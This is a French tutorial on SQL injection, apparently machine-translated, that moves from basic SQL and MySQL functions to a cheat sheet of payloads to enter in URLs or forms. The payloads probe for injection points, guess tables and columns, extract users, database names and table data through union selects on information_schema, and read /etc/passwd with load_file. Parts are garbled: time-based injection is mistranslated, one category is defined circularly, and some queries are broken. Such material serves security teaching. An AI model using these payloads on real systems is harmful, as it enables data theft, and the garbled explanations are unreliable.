## I. Aperçu de l'injection SQL

1) L'injection SQL est une méthode d'attaque de réseau qui permet d'ajouter des instructions SQL malveillantes dans les chaînes d'entrée de l'utilisateur afin d'exécuter des commandes non planifiées ou d'accéder à des données non autorisées.
2. l'injection SQL est causée par le manque d'attention portée à la standardisation de l'écriture des instructions SQL et au filtrage des caractères spéciaux pendant le développement d'une application, ce qui fait que l'instruction SQL dans la chaîne saisie par l'utilisateur est prise par le serveur de base de données pour une instruction SQL normale et exécutée. l'injection SQL peut également être causée par l'utilisation de l'épissage de chaîne pour construire l'instruction SQL sans utiliser de requête paramétrée.

## II. syntaxe des opérations de base du langage SQL

1) L'apprentissage de l'injection SQL nécessite une certaine connaissance du langage SQL, une compréhension des instructions et fonctions SQL courantes, ainsi que de la structure et du fonctionnement de la base de données. 
2) **_Enoncés SQL couramment utilisés_** Il y a les suivants : 
   - Requête : l'instruction SELECT permet de sélectionner des données dans une table. Vous pouvez spécifier le nom des colonnes, les conditions, le tri, etc. pour effectuer la requête. Exemple :
```sql
SELECT * FROM person WHERE age > 18 ORDER BY name;
```

   - ADD : Utilisez l'instruction INSERT INTO pour insérer de nouvelles lignes dans un tableau en spécifiant les noms et les valeurs des colonnes à insérer. Exemple :
```sql
INSERT INTO person (id, name, age, gender) VALUES (1, 'sam', 20, 'Male');
```

   - Supprimer : l'instruction DELETE permet de supprimer des lignes d'un tableau et de spécifier les conditions de suppression des lignes. Vous pouvez spécifier les conditions dans lesquelles les lignes doivent être supprimées.
```sql
DELETE FROM person WHERE id = 1;
```

    - Modifier : Utilisez l'instruction UPDATE pour modifier les données d'une table. Vous pouvez spécifier les noms et les valeurs des colonnes à modifier ainsi que les conditions de la modification. Exemple :
```sql
UPDATE person SET age = 21 WHERE id = 1;
```

3) Les fonctions SQL couramment utilisées sont des types suivants : 
   - Fonctions numériques : utilisées pour calculer ou convertir des valeurs numériques, telles que ABS, ROUND, FLOOR, CEIL, POWER, SQRT, SIN, COS, LOG, etc.
   - Fonctions de chaîne : utilisées pour opérer sur des chaînes ou des traitements, telles que CONCAT, SUBSTRING, LENGTH, REPLACE, TRIM, UPPER, LOWER, REVERSE, etc.
   - Fonctions de date et d'heure : utilisées pour formater ou calculer la date et l'heure, telles que CURDATE, CURTIME, NOW, DATE_FORMAT, DATE_ADD, DATE_SUB, DATEDIFF, TIMEDIFF, etc.
   - Fonction d'agrégation : utilisée pour un groupe de valeurs à des fins statistiques ou analytiques, comme SUM, AVG, MIN, MAX, COUNT, DISTINCT, GROUP_CONCAT, etc.
   - Fonctions de fenêtre : utilisées pour trier ou calculer les données après le regroupement, telles que ROW_NUMBER, RANK, DENSE_RANK, NTILE, LAG, LEAD, FIRST_VALUE, LAST_VALUE, etc.
   - 
4. **_MySQL's information_schema_**. information_schema est une base de données MySQL spéciale qui fournit des métadonnées sur le serveur MySQL, telles que les noms des bases de données ou des tables, les types de données des colonnes ou les droits d'accès. Ces informations sont parfois appelées dictionnaire de données ou catalogue système. Vous pouvez utiliser des instructions SQL standard pour interroger les tables de l'information_schema afin d'obtenir des informations sur les métadonnées. En injection SQL, vous pouvez généralement utiliser cette bibliothèque pour interroger des données dans d'autres bibliothèques 
```sql
SELECT TABLE_NAME, TABLE_TYPE
FROM information_schema.TABLES;
```
 

## III. fonctions et déclarations couramment utilisées dans les injections SQL

1. **_Fonctions couramment utilisées dans l'injection SQL_** L'injection SQL est une technique d'attaque qui tire parti de vulnérabilités dans les instructions SQL pour envoyer des commandes SQL malveillantes à une base de données afin d'obtenir des informations sensibles ou d'effectuer des opérations illégales.Les fonctions couramment utilisées dans l'injection SQL sont les suivantes : 
   - database() : cette fonction affiche le nom de la bibliothèque de base de données actuellement utilisée. Exemple :
```sql
SELECT database();
```

   - substring() : cette fonction extrait le contenu d'un champ à partir du champ spécifié. Exemple : cette fonction extrait le contenu d'un champ à partir du champ spécifié :
```sql
SELECT substring('hello', 1, 2); -- cela donne 'he'
SELECT substring(name, 1, 2) FROM person; -- cela retourne les deux premiers caractères de la colonne name dans la table person
```

   - length() : cette fonction permet d'obtenir la longueur de la chaîne ou du champ spécifié. Exemple : cette fonction renvoie la longueur de la chaîne ou du champ spécifié :
```sql
SELECT length('hello'); -- cela donne 5
SELECT length(name) FROM person; -- Retourne la longueur de la colonne name dans la table person.
```

   - concat() : cette fonction concatène plusieurs chaînes ou champs. Exemple :
```sql
SELECT concat('hello', 'world'); -- cela donne'helloworld'
SELECT concat(name, age) FROM person;  -- Renvoie la jointure des colonnes name et age de la table person
```

   - group_concat () : cette fonction permet de relier un groupe de valeurs ; elle est souvent utilisée dans les requêtes de groupe. Exemple : cette fonction est souvent utilisée dans les requêtes de groupe :
```sql
SELECT gender, group_concat(name) FROM person GROUP BY gender; -- Renvoie une liste de noms(name) regroupés par sexe(gender) dans la table person.
```

   - hex() : cette fonction convertit une chaîne de caractères ou un nombre en hexadécimal. Exemple :
```sql
SELECT hex('hello'); -- cela donne  '68656C6C6F'
SELECT hex(123); -- cela donne '7B'
```

   - unhex() : cette fonction convertit un hexadécimal en chaîne de caractères ou en nombre. Exemple :
```sql
SELECT unhex('68656C6C6F'); -- cela donne 'hello'
SELECT CONVERT(UNHEX('68656C6C6F') USING utf8);  -- commande alternative

SELECT unhex('7B'); -- cela donne 123
SELECT CONV('7B', 16, 10);  -- commande alternative

16 est la base (base hexadécimale).
10 est la base cible (base décimale)
```

   - load_file() : cette fonction lit le contenu du fichier spécifié. Exemple : cette fonction lit le contenu du fichier spécifié :
```sql
SELECT load_file('/etc/passwd'); -- Renvoie le contenu du fichier /etc/passwd
```

   - user() : Cette fonction renvoie l'utilisateur utilisé pour la connexion actuelle à la base de données. Exemple :
```sql
SELECT user(); -- renvoie'root@localhost'
```

   - version() : Cette fonction renvoie la version actuelle de la base de données. Exemple :
```sql
SELECT version(); -- renvoie '8.0.26'
```

   - sleep() : cette fonction suspend la base de données pendant un certain nombre de secondes. Exemple :
```sql
SELECT sleep(5); -- Interrompre la base de données pendant 5 secondes
```

   - floor() : cette fonction renvoie le plus grand nombre entier qui n'est pas supérieur à la valeur spécifiée. Exemple : 
```sql
SELECT floor(3.14); -- renvoie 3
```

   - rand() : cette fonction permet de renvoyer un nombre aléatoire. Exemple :
```sql
SELECT rand(); -- renvoie 0.123456
```

2. **_Énoncés couramment utilisés dans les injections SQL_** 
   - Pour déterminer s'il existe un point d'injection : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si la page change. 
```sql
' and 1=1
# ou
' and 1=2
```
 

   - Deviner le nom de la table : saisissez l'instruction suivante dans l'URL ou le formulaire pour vérifier si la table admin existe. 
```sql
and 0<> (select count (*) from *)
# ou
and 0<> (select count (*) from admin)
```
 

   - Obtenir la version de la base de données : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si la version de la base de données peut être affichée. 
```sql
and 1= (select @@VERSION)
# ou
and 1= (select version())
```
 

- Obtenir le nom de la base de données : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si le nom de la base de données peut être affiché.
```sql
and 1= (select db_name ())
#ou
and 1= (select database())
```
 

   - Obtenir le nom de la table : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si le nom de la table peut être affiché. 
```sql
and 1= (select top 1 name from sysobjects where xtype='U')
#ou
and 1= (select table_name from information_schema.tables limit 1)
```
 

   - Obtenir le nom de la colonne : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si le nom de la colonne peut être affiché. 
```sql
and 1= (select top 1 name from syscolumns where id=object_id('nom de la table')
# ou
and 1= (select column_name from information_schema.columns where table_name='nom de la table'limit 1)
```
 

   - Obtenir des données : saisissez l'instruction suivante dans l'URL ou le formulaire pour voir si les données peuvent être affichées. 
```sql
and 1= (select top 1 Nom_colonne from Nom_table)
#ou
and 1= (select Nom_colonne from Nom_colonne limit 1)
```
 
## Commandes courantes dans l'injection SQL

   1) Exemples de commandes courantes utilisées dans l'injection SQL : 
      - Afficher l'utilisateur actuel 
```sql
union select 1, (select user ())--+
```
 

      - Visualisation de la version de la base de données 
```sql
union select 1, (select version ())--+
```
 

      - Affichage du nom de la base de données actuelle 
```sql
union select 1, (select database ())--+
```
 

      - Voir tous les noms de bases de données 
```sql
union select 1, (select group_concat (schema_name) from information_schema.schemata)--+
```
 

      - Afficher tous les noms de tables d'une base de données 
```sql
union select 1, (select group_concat (table_name) from information_schema.tables where table_schema='nom de la base de données')--+
```
 

      - Afficher toutes les colonnes d'un tableau 
```sql
union select 1, (select group_concat (column_name) from information_schema.columns where table_name='nom de la table')--+
```
 

      - Afficher toutes les données d'une colonne 
```sql
union select 1, (select group_concat (colonne) from nom_table)--+
```
 

## V. Catégories d'injection SQL

1) Il existe plusieurs types d'injection SQL : 
   - Injection d'union : peut être utilisée dans le cas d'une injection d'union.
   - Injection booléenne aveugle : ne peut pas se baser sur le contenu de la page à retourner pour déterminer une quelconque information, seulement selon les conditions de vrai ou faux pour juger.
   - Injection d'erreur : la page renvoie un message d'erreur ou les résultats de l'instruction injectée directement dans la page.
   - Injection sans délai : vous ne pouvez juger d'aucune information sur la base du contenu de la page renvoyée, utilisez l'instruction conditionnelle pour voir si l'instruction de délai est exécutée pour juger.
   - Injection empilée : il est possible d'exécuter plusieurs instructions en même temps lors de l'exécution de l'injection.
   - Injection secondaire : injection déclenchée lorsque l'entrée de l'utilisateur est stockée dans la base de données et exécutée à nouveau.
   - Injection à octets larges : injection qui contourne le filtrage en tirant parti des différences d'encodage des caractères.
   - Injection par cookie : injection utilisant les paramètres du cookie.

## VI. Méthodes de détection de l'injection SQL couramment utilisées

1) Il existe plusieurs méthodes de détection de l'injection SQL : 
   - Détection dynamique : en envoyant des instructions SQL spéciales à la base de données et en observant la réponse de la base de données pour déterminer s'il existe une vulnérabilité d'injection SQL.
   - Détection statique : en analysant le code source du programme, en identifiant les instructions susceptibles de présenter un risque d'injection SQL et en les réparant ou en les optimisant.
   - Insertion de guillemets simples ou doubles : en ajoutant des guillemets simples ou doubles aux paramètres, voir s'il y a un message d'erreur de la base de données et juger s'il y a un point d'injection.
   - Utiliser des outils de détection des injections SQL : tels que SQLMap, SQLNinja, Havij, etc., qui peuvent automatiser la découverte et l'exploitation des vulnérabilités des injections SQL.
